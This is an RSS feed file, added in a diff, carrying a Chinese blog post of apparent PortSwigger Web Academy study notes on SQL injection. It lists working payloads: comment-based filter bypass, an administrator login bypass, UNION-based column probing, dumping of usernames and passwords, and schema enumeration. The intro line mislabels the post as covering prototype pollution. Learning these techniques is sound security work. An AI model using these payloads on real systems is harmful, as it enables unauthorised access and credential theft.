@@ -1,0 +1,1403 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>PortSwigger Web Academy - Tag - 索元的博客</title>
+        <link>http://localhost:1313/tags/portswigger-web-academy/</link>
+        <description>PortSwigger Web Academy - Tag - 索元的博客</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>s5n666@outlook.com (suo yuan)</managingEditor>
+            <webMaster>s5n666@outlook.com (suo yuan)</webMaster><lastBuildDate>Tue, 27 Dec 2022 03:42:51 &#43;0000</lastBuildDate><atom:link href="http://localhost:1313/tags/portswigger-web-academy/" rel="self" type="application/rss+xml" /><item>
+    <title>SQL Injection</title>
+    <link>http://localhost:1313/posts/portswigger_sqlinj/</link>
+    <pubDate>Tue, 27 Dec 2022 03:42:51 &#43;0000</pubDate>
+    <author>suo yuan</author>
+    <guid>http://localhost:1313/posts/portswigger_sqlinj/</guid>
+    <description><![CDATA[<p>PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分</p>
+<h1 id="sql-injection">SQL Injection</h1>
+<h2 id="漏洞概述">漏洞概述</h2>
+<p>SQL注入是一个Web漏洞。该漏洞能够让攻击者影响Web应用对其数据库的查询，通常允许攻击者查看无法查看到的数据，其中可能包括其他用户的数据。很多时候攻击者可以通过该漏洞修改甚至删除这些数据。</p>
+<h3 id="成功的sql注入的影响如何">成功的SQL注入的影响如何</h3>
+<p>成功的SQL注入可能导致未授权访问敏感数据。近年来很多数据泄露事件都是SQL注入导致。有时攻击者可以依此在系统中获取一个持久的后门。</p>
+<h2 id="漏洞利用方向">漏洞利用方向</h2>
+<p>一个常见的SQL注入的利用方向包括：</p>
+<ul>
+<li>返回隐藏数据，修改SQL查询以返回其他结果</li>
+<li>更改Web应用逻辑，更改查询以干扰Web应用的逻辑</li>
+<li>联合查询，从不同的数据库检索数据</li>
+<li>查询数据库本身的信息</li>
+<li>盲注，查询的结果不会返回</li>
+</ul>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="返回隐藏数据">返回隐藏数据</h3>
+<p>假设一个显示不同类别的购物网站，用户单击礼物的时候，请求的URL是这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/products?category=Gifts</span></span></code></pre></div></div>
+<p>这将导致Web应用执行SQL查询，从数据库中查找相关产品的信息</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">released</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span></span></span></code></pre></div></div>
+<p>该SQL查询要求数据库返回：</p>
+<ul>
+<li>所有 (*)</li>
+<li>来自<code>product</code>表</li>
+<li>其中的<code>category</code>得是<code>Gifts</code></li>
+<li>并且<code>released</code>等于1</li>
+</ul>
+<p>其中<code>released = 1</code>用于隐藏没有发布的产品。如果该网站没有防御SQL注入的话，攻击者修改URL成这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/products?category=Gifts&#39;--</span></span></code></pre></div></div>
+<p>这样SQL语句就得是：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="c1">--&#39; AND released = 1</span></span></span></code></pre></div></div>
+<p>这里的关键就是<code>--</code>，这是SQL中的注释符号。这样就有效地屏蔽了<code>AND released = 1</code>的作用。</p>
+<p>攻击者还可以更进一步，查看任何类别的所有产品：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://insecure-website.com/products?category=Gifts&#39;+OR+1=1--</span></span></code></pre></div></div>
+<p>SQL语句就会是：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--&#39; AND released = 1</span></span></span></code></pre></div></div>
+<p>这样就会返回<code>category</code>是<code>Gifts</code>或者<code>1=1</code>的产品，因为1肯定是等于1的，所以会返回所有。</p>
+<p><code>--</code>是SQL中的注释符号。在MYSQL中，<code>--</code>后面需要跟一个空格，或者使用<code>#</code>来表示注释符。</p>
+<h3 id="更改web应用逻辑">更改Web应用逻辑</h3>
+<p>假设一个允许用户通过用户名和密码的方式登录的网站。用户提交用户名为username，密码为passwd，Web应用确认是否这正确的SQL语句这样写：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;username&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;passwd&#39;</span></span></span></code></pre></div></div>
+<p>这里攻击者可以作为任意用户登录，只需SQL中的注释符号<code>--</code>，屏蔽掉密码检查那一部分。例如提交用户名<code>administrator'--</code>和一个空密码就会让SQL语句变成这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="c1">--&#39; AND password = &#39;&#39;</span></span></span></code></pre></div></div>
+<h3 id="联合查询">联合查询</h3>
+<p>攻击者可以从数据库的其他表中检查数据，这是利用<code>UNION</code>关键字完成，它允许再加一个或多个<code>SELECT</code>查询并把结果追加到原本的查询结果上。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">c</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span></span></span></code></pre></div></div>
+<p>这个SQL查询将返回一个包含两个列的结果，包含<code>table1</code>的a、b的值和<code>table2</code>的c、d的值。</p>
+<p>联合查询的要求：</p>
+<ul>
+<li>每个查询返回的列的数量是相同的</li>
+<li>每个列的数据类型必须和各个查询兼容</li>
+</ul>
+<p>为了满足这两个要求，通常要弄清楚：</p>
+<ul>
+<li>原本的查询返回多少列</li>
+<li>原本的查询返回的那些列有合适的数据类型用来保存查询的结果</li>
+</ul>
+<h4 id="确定列的数量">确定列的数量</h4>
+<h5 id="order-by">ORDER BY</h5>
+<p>注入一系列<code>ORDER BY</code>语句并递增指定的column index直到报错。假设注入点和上述都差不多，就应该是：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; ORDER BY 1--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; ORDER BY 2--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; ORDER BY 3--
+</span></span></span><span class="line"><span class="cl"><span class="s1">etc.</span></span></span></code></pre></div></div>
+<p>上述这些payload修改了原本的查询，让结果中的所有列按照其中某一列的顺序进行排序，具体哪一列由<code>ORDER BY</code>指定，因此无需知晓列的名称。当指定的column index超过了实际的列的数量时，数据库就会报错，比如：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">The ORDER BY position number 3 is out of range of the number of items in the select list.</span></span></code></pre></div></div>
+<p>网站可能会在HTTP响应中体现出这个错误，也可能是在返回结果中，或者就不返回。检测响应中的差异来判断到底由多少列。</p>
+<h5 id="union-select">UNION SELECT</h5>
+<p>提交一系列<code>UNION SELECT</code>的payload，指定不同数量的空值：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,NULL--
+</span></span></span><span class="line"><span class="cl"><span class="s1">etc.</span></span></span></code></pre></div></div>
+<p>如果空值的数量和列的数目不一样，数据库就会报错，如：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</span></span></code></pre></div></div>
+<p>和第一个方法一样，网站对返回报错的态度是不一样的。当空值的数量和列的数量匹配时，数据库会多返回一行，其中每列都是空值。对HTTP响应的影响取决去网站代码。幸运的话，攻击者可以在响应中看到额外的内容，比如HTML表中的另一行。否则空值会触发不同的错误，如<code>NullPointerException</code>。最难的是，该响应可能因为不正确的空值数量引起的响应无法区分，导致这个方法失效。</p>
+<p>使用NULL的原因是因为每个列的数据类型有个兼容问题，NULL可以转换成任何常用的数据类型，可以最大限度地提高payload得以成功的机会。</p>
+<p>在Orcale数据库中，每一个<code>SELECT</code>查询都需要一个<code>FROM</code>关键字并指定一个有效的表。Orcale有一个<code>double</code>内置表。因此，payload在Orcale数据库中可以是这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL FROM DUAL--</span></span></span></code></pre></div></div>
+<h4 id="查找有用的列">查找有用的列</h4>
+<p>通常查找的数据将采用字符串的格式，因此攻击者需要再原本查询结果中找到一个或多个数据类型为字符串或者和它兼容的列。</p>
+<p>确定了列的数量后，可以提交一系列的<code>UNION SELECT</code>的paylaod来测试每个列，以测试是否可以保存字符串数据，例如：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,NULL,NULL,NULL--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL,NULL--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
+<p>如果列的数据类型和字符串数据不兼容就会报错，如：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Conversion</span> <span class="n">failed</span> <span class="n">when</span> <span class="n">converting</span> <span class="n">the</span> <span class="n">varchar</span> <span class="n">value</span> <span class="s1">&#39;a&#39;</span> <span class="n">to</span> <span class="n">data</span> <span class="n">type</span> <span class="ne">int</span><span class="o">.</span></span></span></code></pre></div></div>
+<p>如果没有报错。并且网站的响应包含一些附加内容（注入的字符串值），就可以用这个列来查询字符串数据。</p>
+<h4 id="查询数据">查询数据</h4>
+<p>当确定了列的个数和有用的列的位置，就可以开始查询数据了。</p>
+<p>假设：</p>
+<ul>
+<li>原本的查询返回两列，两列都可以保存字符串数据</li>
+<li>注入点和上述一样是<code>WHERE</code>中带单引号的字符串</li>
+<li>数据库中有一个名为<code>users</code>的表，其中由<code>username</code>和<code>password</code>两列</li>
+</ul>
+<p>这样的话，相关payload应当是这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username, password FROM users--</span></span></span></code></pre></div></div>
+<p>使用这样的payload的关键也在于攻击者知道表名和列名。现在数据库都提供了一些方法去确定它有那些表和列。</p>
+<h5 id="在一个列中查询多个值">在一个列中查询多个值</h5>
+<p>还是上述的例子，如果只有一个合适的列的话，可以把这些值连接到一起并在中间加上用于区分的分隔符。例如，在Orcale中，payload可以是这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username || &#39;</span><span class="o">~</span><span class="s1">&#39; || password FROM users--</span></span></span></code></pre></div></div>
+<p><code>||</code>在Orcale中用于字符串连接。该payload把用户名和密码连接起来，并且用<code>~</code>分隔</p>
+<h3 id="查询数据库本身的信息">查询数据库本身的信息</h3>
+<p>SQL注入中，通常需要收集与数据库本身相关的信息，比如数据库的类型和版本，以及包含的表名和列名。</p>
+<h4 id="数据库的类型和版本">数据库的类型和版本</h4>
+<p>不同的数据库的查询语句也不同。通常需要多次查询来找到一个有效的查询，从而确定数据库的类型和版本</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">查询语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Microsoft, MySQL</td>
+          <td style="text-align: center">SELECT @@version</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">SELECT * FROM v$version</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">SELECT version()</td>
+      </tr>
+  </tbody>
+</table>
+<p>例如你输入如下paylaod</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT @@version--</span></span></span></code></pre></div></div>
+<p>如果返回类似下面的输出，那就确认数据库是Microsoft SQL Server并且也能得到它的版本</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+</span></span><span class="line"><span class="cl">Mar 18 2018 09:11:49
+</span></span><span class="line"><span class="cl">Copyright (c) Microsoft Corporation
+</span></span><span class="line"><span class="cl">Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)</span></span></code></pre></div></div>
+<h4 id="列出数据库的内容">列出数据库的内容</h4>
+<p>大多数数据库（除了Orcale）都有一个information schema用于提供有关数据库的信息</p>
+<p>攻击者可以查询<code>information_schema.tables</code>以列出数据库中的表</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span></span></span></code></pre></div></div>
+<p>输出可能是这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+</span></span><span class="line"><span class="cl">=====================================================
+</span></span><span class="line"><span class="cl">MyDatabase     dbo           Products    BASE TABLE
+</span></span><span class="line"><span class="cl">MyDatabase     dbo           Users       BASE TABLE
+</span></span><span class="line"><span class="cl">MyDatabase     dbo           Feedback    BASE TABLE</span></span></code></pre></div></div>
+<p>这个输出表明由三个表，分别是Products、Users和Feedback。</p>
+<p>攻击者可以通过查询<code>information_schema.columns</code>来列出指定表的列</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
